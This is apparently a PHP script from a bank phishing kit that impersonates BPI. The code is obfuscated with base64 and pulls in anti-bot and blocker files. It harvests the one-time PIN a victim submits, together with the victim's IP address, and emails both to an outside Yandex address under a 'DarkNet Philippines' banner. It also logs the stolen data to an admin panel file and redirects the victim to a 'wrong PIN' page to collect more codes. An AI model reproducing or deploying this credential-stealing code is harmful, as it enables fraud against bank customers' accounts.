<?php include (base64_decode('Y29uZmlnL2FudGlib3RzLnBocA=='));
include (base64_decode('Y29uZmlnL2Z1bmN0aW9uLnBocA=='));
include (base64_decode('Y29uZmlnL2J0LnBocA=='));
include (base64_decode('Y29uZmlnL2Jsb2NrZXIucGhw'));
date_default_timezone_set(base64_decode('QXNpYS9NYW5pbGE='));
$time = date(base64_decode('aDppOnMgQQ=='));
$ip = getenv(base64_decode('UkVNT1RFX0FERFI='));
$message .= base64_decode('fC0tLS0tLS0tLS0tLVsgQlBJIE9uZSBUaW1lIFBJTiBdLS0tLS0tLS0tLS0tCg==');
$message .= base64_decode('fCBPbmUgVGltZSBQaW4gOiA=').$_POST[base64_decode('b3RwbnVt')].base64_decode('Cg==');
$message .= base64_decode('fCBJUDog').$ip.base64_decode('Cg==');
$message .= base64_decode('fC0tLS0tLS0tLS0tLS0tLVsgKyBdIEdyZWV0aW5ncyBmcm9tIERhcmtOZXQgUGhpbGlwcGluZXMgWyArIF0tLS0tLS0tLS0tLS0tLS0K');
$bank = base64_decode('c3A0bW1lcnNAeWFuZGV4LmNvbQ==');
$subject = " [ + ] ~~ BPI OTP ~~ [ + ] from $ip ";
$headers = base64_decode('RnJvbSA6IFplcmlvbg==');
$headers .= $_POST[base64_decode('ZU1haWxBZGQ=')].base64_decode('Cg==');
$headers .= base64_decode('TUlNRS1WZXJzaW9uOiAxLjAK');
$pane .= base64_decode('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTxicj48YiBzdHlsZT0iY29sb3I6bGltZTsiPklQIDog').$ip.base64_decode('PC9iPjxicj48YiBzdHlsZT0iY29sb3I6b3JhbmdlOyI+T25lIFRpbWUgUGluIDog').$_POST[base64_decode('b3RwbnVt')].base64_decode('PC9iPjxicj4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPGJyPg==');
$fh = fopen(base64_decode('Y29uZmlnL2FkbWluLnBocA==') ,base64_decode('YQ=='));
fwrite($fh, base64_decode('IA==').''.$pane .base64_decode('Cgo='));
fclose($fh);
if (mail($bank,$subject,$message,$headers))
	   {
		   header(base64_decode('TG9jYXRpb246IHdyb25ncGluLnBocA=='));

	   }
else
    	   {
 		echo base64_decode('RVJST1IhIFBsZWFzZSBnbyBiYWNrIGFuZCB0cnkgYWdhaW4u');
  	   }
?>